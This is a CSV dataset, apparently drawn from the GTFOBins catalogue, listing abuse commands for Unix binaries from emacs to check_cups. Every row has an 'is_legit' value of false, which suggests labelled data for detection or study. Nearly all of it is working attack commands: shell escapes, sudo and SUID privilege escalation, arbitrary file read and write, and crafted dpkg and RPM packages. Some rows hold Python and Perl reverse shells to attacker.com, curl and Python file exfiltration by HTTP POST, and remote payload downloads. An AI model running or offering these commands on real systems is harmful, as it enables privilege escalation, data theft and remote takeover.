"Name","functions","functions_shell","functions_shell_description","functions_shell_code","functions_sudo","functions_sudo_description","functions_sudo_code","description","functions_file-read","functions_file-read_code","functions_suid","functions_suid_code","functions_file-write","functions_file-write_code","functions_limited-suid","functions_limited-suid_code","functions_file-download","functions_file-download_description","functions_file-download_code","functions_file-read_description","functions_suid_description","functions_non-interactive-reverse-shell","functions_non-interactive-reverse-shell_description","functions_non-interactive-reverse-shell_code","functions_command","functions_command_description","functions_command_code","functions_file-upload","functions_file-upload_description","functions_file-upload_code","functions_file-write_description","functions_reverse-shell","functions_reverse-shell_description","functions_reverse-shell_code","functions_non-interactive-bind-shell","functions_non-interactive-bind-shell_description","functions_non-interactive-bind-shell_code","functions_library-load","functions_library-load_description","functions_library-load_code","functions_capabilities","functions_capabilities_description","functions_capabilities_code","functions_limited-suid_description","functions_bind-shell","functions_bind-shell_description","functions_bind-shell_code","is_legit"
"emacs","","","emacs -Q -nw --eval '(term ""/bin/sh"")'","","","sudo emacs -Q -nw --eval '(term ""/bin/sh"")'","","","emacs file_to_read","","./emacs -Q -nw --eval '(term ""/bin/sh -p"")'","","emacs file_to_write DATA C-x C-s","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"elvish","","","elvish","","","sudo elvish","","","export LFILE=file_to_read elvish -c 'echo (slurp <$E:LFILE)'","","./elvish","","export LFILE=file_to_write elvish -c 'echo DATA >$E:LFILE'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"efax","","","","","","LFILE=file_to_read sudo efax -d ""$LFILE""","The content is actually parsed by the command, thus it may not be suitable for reading arbitrary files.","","","","LFILE=file_to_read ./efax -d ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ed","","","ed !/bin/sh","","","sudo ed !/bin/sh","","","ed file_to_read ,p q","","./ed file_to_read ,p q","","ed file_to_write a DATA . w q","","./ed !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"eb","","","eb logs !/bin/sh","","","sudo eb logs !/bin/sh","This invokes the default logging service, which is likely to be [`journalctl`](/gtfobins/journalctl/), other functions may apply. For this to work the target must be connected to AWS instance via EB-CLI.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"easy_install","","","TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py easy_install $TF","","","TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py sudo easy_install $TF","","","TF=$(mktemp -d) echo 'print(open(""file_to_read"").read())' > $TF/setup.py easy_install $TF","","","","export LFILE=/tmp/file_to_save TF=$(mktemp -d) echo ""import os; os.execl('$(whereis python)', 'python', '-c', 'open(\""$LFILE\"",\""w+\"").write(\""DATA\"")')"" > $TF/setup.py easy_install $TF","","","","Fetch a remote file via HTTP GET request. The file path must be absolute.","export URL=http://attacker.com/file_to_get export LFILE=/tmp/file_to_save TF=$(mktemp -d) echo ""import os; os.execl('$(whereis python)', '$(whereis python)', '-c', \""\""\""import sys; if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve('$URL', '$LFILE')\""\""\"")"" > $TF/setup.py pip install $TF","The read file content is wrapped within program messages.","","","","","","","","","[''Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Serve files in the local folder running an HTTP server.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send TF=$(mktemp -d) echo 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py easy_install $TF ''-|-''export LPORT=8888 TF=$(mktemp -d) echo 'import sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py easy_install $TF '']","The file path must be absolute.","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 TF=$(mktemp -d) echo 'import sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")' > $TF/setup.py easy_install $TF","","","","","","TF=$(mktemp -d) echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py easy_install $TF","","","","","","","","false"
"dvips","","","tex '\special{psfile=""`/bin/sh 1>&0""}\end' dvips -R0 texput.dvi","","","tex '\special{psfile=""`/bin/sh 1>&0""}\end' sudo dvips -R0 texput.dvi","The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.","","","","","","","","tex '\special{psfile=""`/bin/sh 1>&0""}\end' ./dvips -R0 texput.dvi","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dstat","","","mkdir -p ~/.dstat echo 'import os; os.execv(""/bin/sh"", [""sh""])' >~/.dstat/dstat_xxx.py dstat --xxx","","","echo 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py sudo dstat --xxx","`dstat` allows you to run arbitrary [`python`](/gtfobins/python/) scripts loaded as ""external plugins"" if they are located in one of the directories stated in the `dstat` man page under ""FILES"":  1. `~/.dstat/` 2. `(path of binary)/plugins/` 3. `/usr/share/dstat/` 4. `/usr/local/share/dstat/`  Pick the one that you can write into.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dpkg","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","dpkg -l !/bin/sh","","[''This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` TF=$(mktemp -d) echo 'exec /bin/sh' > $TF/x.sh fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF ``` '']","[''sudo dpkg -l !/bin/sh ''-|-''sudo dpkg -i x_1.0_all.deb'']","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dotnet","","","dotnet fsi System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;","","","sudo dotnet fsi System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;","","","export LFILE=file_to_read dotnet fsi System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dosbox","","","","","Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.","LFILE='\path\to\file_to_write' sudo dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) is used.","","[''LFILE='\path\to\file_to_read' dosbox -c 'mount c /' -c ""type c:$LFILE"" ''-|-''LFILE='\path\to\file_to_read' dosbox -c 'mount c /' -c ""copy c:$LFILE c:\tmp\output"" -c exit cat '/tmp/OUTPUT' '']","","LFILE='\path\to\file_to_write' ./dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","","LFILE='\path\to\file_to_write' dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","","","","","","[''The file content will be displayed in the DOSBox graphical window.''-|-''The file is copied to a readable location.'']","Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.","","","","","","","","","","Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.","","","","","","","","","","","","","","","","","false"
"dos2unix","","","","","","","","","","","","","LFILE1=file_to_read LFILE2=file_to_write dos2unix -f -n ""$LFILE1"" ""$LFILE2""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"docker","","The resulting is a root shell.","docker run -v /:/mnt --rm -it alpine chroot /mnt sh","","The resulting is a root shell.","sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh","This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.  Any other Docker Linux image should work, e.g., `debian`.","","CONTAINER_ID=""$(docker run -d alpine)""  # or existing TF=$(mktemp) docker cp file_to_read $CONTAINER_ID:$TF docker cp $CONTAINER_ID:$TF $TF cat $TF","","./docker run -v /:/mnt --rm -it alpine chroot /mnt sh","","CONTAINER_ID=""$(docker run -d alpine)"" # or existing TF=$(mktemp) echo ""DATA"" > $TF docker cp $TF $CONTAINER_ID:$TF docker cp $CONTAINER_ID:$TF file_to_write","","","","","","Read a file by copying it to a temporary container and back to a new location on the host.","The resulting is a root shell.","","","","","","","","","","Write a file by copying it to a temporary container and back to the target destination on the host.","","","","","","","","","","","","","","","","","false"
"dnf","","","","","It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` TF=$(mktemp -d) echo 'id' > $TF/x.sh fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF ```","sudo dnf install -y x-1.0-1.noarch.rpm","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dmsetup","","","","","","sudo dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF sudo dmsetup ls --exec '/bin/sh -s'","","","","","./dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF ./dmsetup ls --exec '/bin/sh -p -s'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dmidecode","","","","","It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode. Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.  - `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.  - `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.  ``` make dmiwrite TF=$(mktemp) echo ""DATA"" > $TF ./dmiwrite $TF x.dmi ```","LFILE=file_to_write sudo dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dmesg","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","dmesg -H !/bin/sh","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","sudo dmesg -H !/bin/sh","","","LFILE=file_to_read dmesg -rF ""$LFILE""","","","","","","","","","","This is not suitable for binary files.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"distcc","","","distcc /bin/sh","","","sudo distcc /bin/sh","","","","","./distcc /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dig","","","","","","LFILE=file_to_read sudo dig -f $LFILE","Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation, so this may not be suitable for binary files. Grepping for `DiG` might help to filter out unwanted content.","","LFILE=file_to_read dig -f $LFILE","","LFILE=file_to_read ./dig -f $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"diff","","","","","","LFILE=file_to_read sudo diff --line-format=%L /dev/null $LFILE","","","[''LFILE=file_to_read diff --line-format=%L /dev/null $LFILE ''-|-''LFOLDER=folder_to_list TF=$(mktemp -d) diff --recursive $TF $LFOLDER '']","","LFILE=file_to_read ./diff --line-format=%L /dev/null $LFILE","","","","","","","","This lists the content of a directory. `$TF` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dialog","","","","","","LFILE=file_to_read sudo dialog --textbox ""$LFILE"" 0 0","The file is shown in an interactive TUI dialog, thus it is not suitable for binary/too big data.","","LFILE=file_to_read dialog --textbox ""$LFILE"" 0 0","","LFILE=file_to_read ./dialog --textbox ""$LFILE"" 0 0","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"debugfs","","","debugfs !/bin/sh","","","sudo debugfs !/bin/sh","","","","","./debugfs !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dd","","","","","","LFILE=file_to_write echo ""data"" | sudo dd of=$LFILE","","","LFILE=file_to_read dd if=$LFILE","","LFILE=file_to_write echo ""data"" | ./dd of=$LFILE","","LFILE=file_to_write echo ""DATA"" | dd of=$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dc","","","dc -e '!/bin/sh'","","","sudo dc -e '!/bin/sh'","","","","","","","","","./dc -e '!/bin/sh'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"date","","","","","","LFILE=file_to_read sudo date -f $LFILE","Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.  This only works for the GNU variant of `date`.","","LFILE=file_to_read date -f $LFILE","","LFILE=file_to_read ./date -f $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dash","","","dash","","","sudo dash","","","","","./dash -p","","export LFILE=file_to_write dash -c 'echo DATA > $LFILE'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cut","","","","","","LFILE=file_to_read sudo cut -d """" -f1 ""$LFILE""","","","LFILE=file_to_read cut -d """" -f1 ""$LFILE""","","LFILE=file_to_read ./cut -d """" -f1 ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"curl","","","","","Fetch a remote file via HTTP GET request.","URL=http://attacker.com/file_to_get LFILE=file_to_save sudo curl $URL -o $LFILE","","","LFILE=/tmp/file_to_read curl file://$LFILE","","URL=http://attacker.com/file_to_get LFILE=file_to_save ./curl $URL -o $LFILE","","LFILE=file_to_write TF=$(mktemp) echo DATA >$TF curl ""file://$TF"" -o ""$LFILE""","","","","Fetch a remote file via HTTP GET request.","URL=http://attacker.com/file_to_get LFILE=file_to_save curl $URL -o $LFILE","The file path must be absolute.","Fetch a remote file via HTTP GET request.","","","","","","","","Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.","URL=http://attacker.com/ LFILE=file_to_send curl -X POST -d ""@$LFILE"" $URL","The file path must be absolute.","","","","","","","","","","","","","","","","","false"
"cupsfilter","","","","","","LFILE=file_to_read sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE","","","LFILE=file_to_read cupsfilter -i application/octet-stream -m application/octet-stream $LFILE","","LFILE=file_to_read ./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"csvtool","","","csvtool call '/bin/sh;false' /etc/passwd","","","sudo csvtool call '/bin/sh;false' /etc/passwd","","","LFILE=file_to_read csvtool trim t $LFILE","","LFILE=file_to_read ./csvtool trim t $LFILE","","LFILE=file_to_write TF=$(mktemp) echo DATA > $TF csvtool trim t $TF -o $LFILE","","","","","","The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.","","","","","","","","","","","The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.","","","","","","","","","","","","","","","","","false"
"csplit","","","","","","LFILE=file_to_read csplit $LFILE 1 cat xx01","","","LFILE=file_to_read csplit $LFILE 1 cat xx01","","LFILE=file_to_read csplit $LFILE 1 cat xx01","","TF=$(mktemp) echo ""DATA"" > $TF LFILE=file_to_write csplit -z -b ""%d$LFILE"" $TF 1","","","","","","","","","","","","","","","","","Writes the data to `xx0file_to_write`. If needed, a different prefix can be specified with `-f` (instead of `xx`).","","","","","","","","","","","","","","","","","false"
"csh","","","csh","","","sudo csh","","","","","./csh -b","","export LFILE=file_to_write ash -c 'echo DATA > $LFILE'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"crontab","","","","","The commands are executed according to the crontab file edited via the `crontab` utility.","sudo crontab -e","","","","","","","","","","","","","","","","","","","The commands are executed according to the crontab file edited via the `crontab` utility.","crontab -e","","","","","","","","","","","","","","","","","","","","","false"
"crash","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","crash -h !sh","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","sudo crash -h !sh","","","","","","","","","","","","","","","","","","","","COMMAND='/usr/bin/id' CRASHPAGER=""$COMMAND"" crash -h","","","","","","","","","","","","","","","","","","","","","false"
"cpulimit","","","cpulimit -l 100 -f /bin/sh","","","sudo cpulimit -l 100 -f /bin/sh","","","","","./cpulimit -l 100 -f -- /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cpio","","","echo '/bin/sh </dev/tty >/dev/tty' >localhost cpio -o --rsh-command /bin/sh -F localhost:","","[''The whole directory structure is copied to `$TF`.''-|-''Copies `$LFILE` to the `$LDIR` directory.'']","[''echo '/bin/sh </dev/tty >/dev/tty' >localhost sudo cpio -o --rsh-command /bin/sh -F localhost: ''-|-''LFILE=file_to_read TF=$(mktemp -d) echo ""$LFILE"" | sudo cpio -R $UID -dp $TF cat ""$TF/$LFILE"" ''-|-''LFILE=file_to_write LDIR=where_to_write echo DATA >$LFILE echo $LFILE | sudo cpio -R 0:0 -p $LDIR'']","","","[''LFILE=file_to_read echo ""$LFILE"" | cpio -o ''-|-''LFILE=file_to_read TF=$(mktemp -d) echo ""$LFILE"" | cpio -dp $TF cat ""$TF/$LFILE"" '']","","[''LFILE=file_to_read TF=$(mktemp -d) echo ""$LFILE"" | ./cpio -R $UID -dp $TF cat ""$TF/$LFILE"" ''-|-''LFILE=file_to_write LDIR=where_to_write echo DATA >$LFILE echo $LFILE | ./cpio -R 0:0 -p $LDIR '']","","LFILE=file_to_write LDIR=where_to_write echo DATA >$LFILE echo $LFILE | cpio -up $LDIR","","","","","","[''The content of the file is printed to standard output, between the cpio archive format header and footer.''-|-''The whole directory structure is copied to `$TF`.'']","[''The whole directory structure is copied to `$TF`.''-|-''Copies `$LFILE` to the `$LDIR` directory.'']","","","","","","","","","","Copies `$LFILE` to the `$LDIR` directory.","","","","","","","","","","","","","","","","","false"
"cpan","","`cpan` lets you execute perl commands with the `! command`.","cpan ! exec '/bin/bash'","","","sudo cpan ! exec '/bin/bash'","","","","","","","","","","","Fetch a remote file via an HTTP GET request and store it in `PWD`.","export URL=http://attacker.com/file_to_get cpan ! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();","","","","","","","","","","Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.","cpan ! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();","","","Run `nc -lvp RPORT` on the attacker box to receive the shell.","export RHOST=localhost export RPORT=9000 cpan ! use Socket; my $i=""$ENV{RHOST}""; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp"")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S""); open(STDOUT,"">&S""); open(STDERR,"">&S""); exec(""/bin/sh -i"");};","","","","","","","","","","","","","","false"
"cp","","","","","[''This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)''-|-''This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.'']","[''LFILE=file_to_write echo ""DATA"" | sudo cp /dev/stdin ""$LFILE"" ''-|-''LFILE=file_to_write TF=$(mktemp) echo ""DATA"" > $TF sudo cp $TF $LFILE ''-|-''sudo cp /bin/sh /bin/cp sudo cp'']","","","LFILE=file_to_read cp ""$LFILE"" /dev/stdout","","[''LFILE=file_to_write echo ""DATA"" | ./cp /dev/stdin ""$LFILE"" ''-|-''LFILE=file_to_write TF=$(mktemp) echo ""DATA"" > $TF ./cp $TF $LFILE ''-|-''LFILE=file_to_change ./cp --attributes-only --preserve=all ./cp ""$LFILE"" '']","","LFILE=file_to_write echo ""DATA"" | cp /dev/stdin ""$LFILE""","","","","","","","[''This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)''-|-''This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.'']","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cowthink","","","TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF cowthink -f $TF x","","","TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF sudo cowthink -f $TF x","It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cowsay","","","TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF cowsay -f $TF x","","","TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF sudo cowsay -f $TF x","It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"composer","","","TF=$(mktemp -d) echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json composer --working-dir=$TF run-script x","","","TF=$(mktemp -d) echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json sudo composer --working-dir=$TF run-script x","","","","","","","","","TF=$(mktemp -d) echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json ./composer --working-dir=$TF run-script x","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"comm","","","","","","LFILE=file_to_read sudo comm $LFILE /dev/null 2>/dev/null","","","LFILE=file_to_read comm $LFILE /dev/null 2>/dev/null","","LFILE=file_to_read comm $LFILE /dev/null 2>/dev/null","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"column","","","","","","LFILE=file_to_read sudo column $LFILE","`column` expects textual data.","","LFILE=file_to_read column $LFILE","","LFILE=file_to_read ./column $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cobc","","","TF=$(mktemp -d) echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x cobc -xFj --frelax-syntax-checks $TF/x","","","TF=$(mktemp -d) echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x sudo cobc -xFj --frelax-syntax-checks $TF/x","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cmp","","","","","","LFILE=file_to_read sudo cmp $LFILE /dev/zero -b -l","Dump the bytes of the input file that are different from the NUL byte in a tabular format, hence this may not be suitable to read arbitrary binary files.","","LFILE=file_to_read cmp $LFILE /dev/zero -b -l","","LFILE=file_to_read ./cmp $LFILE /dev/zero -b -l","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"clamscan","","","","","","LFILE=file_to_read TF=$(mktemp -d) touch $TF/empty.yara sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","Each line of the file is interpreted as a path and the content is leaked via error messages, thus this might not be suitable to read binary files. The output can optionally be cleaned using `sed`.","","LFILE=file_to_read TF=$(mktemp -d) touch $TF/empty.yara clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","","LFILE=file_to_read TF=$(mktemp -d) touch $TF/empty.yara ./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"chroot","","","","","","sudo chroot /","","","","","./chroot / /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"chown","","","","","","LFILE=file_to_change sudo chown $(id -un):$(id -gn) $LFILE","This can be run with elevated privileges to change ownership and then read, write, or execute a file.","","","","LFILE=file_to_change ./chown $(id -un):$(id -gn) $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"choom","","","choom -n 0 /bin/sh","","","sudo choom -n 0 /bin/sh","","","","","./choom -n 0 -- /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"chmod","","","","","","LFILE=file_to_change sudo chmod 6777 $LFILE","This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.","","","","LFILE=file_to_change ./chmod 6777 $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"check_statusfile","","","","","","LFILE=file_to_read sudo check_statusfile $LFILE","This is the `check_statusfile` Nagios plugi plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.","","LFILE=file_to_read check_statusfile $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"check_ssl_cert","","","","","The host example.net must return a certificate via TLS","COMMAND=id OUTPUT=output_file TF=$(mktemp) echo ""$COMMAND | tee $OUTPUT"" > $TF chmod +x $TF umask 022 check_ssl_cert --curl-bin $TF -H example.net cat $OUTPUT","This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.","","","","","","","","","","","","","","","","","","The host example.net must return a certificate via TLS","COMMAND=id OUTPUT=output_file TF=$(mktemp) echo ""$COMMAND | tee $OUTPUT"" > $TF chmod +x $TF check_ssl_cert --curl-bin $TF -H example.net cat $OUTPUT","","","","","","","","","","","","","","","","","","","","","false"
"check_raid","","","","","","LFILE=file_to_read sudo check_raid --extra-opts=@$LFILE","This is the `check_raid` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.","","LFILE=file_to_read check_raid --extra-opts=@$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"check_memory","","","","","","LFILE=file_to_read sudo check_memory --extra-opts=@$LFILE","This is the `check_memory` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.","","LFILE=file_to_read check_memory --extra-opts=@$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"check_log","","","","","","LFILE=file_to_write INPUT=input_file sudo check_log -F $INPUT -O $LFILE","This is the `check_log` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.","","LFILE=file_to_read OUTPUT=output_file check_log -F $LFILE -O $OUTPUT cat $OUTPUT","","","","LFILE=file_to_write INPUT=input_file check_log -F $INPUT -O $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"check_cups","","","","","","LFILE=file_to_read sudo check_cups --extra-opts=@$LFILE","This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.","","LFILE=file_to_read check_cups --extra-opts=@$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
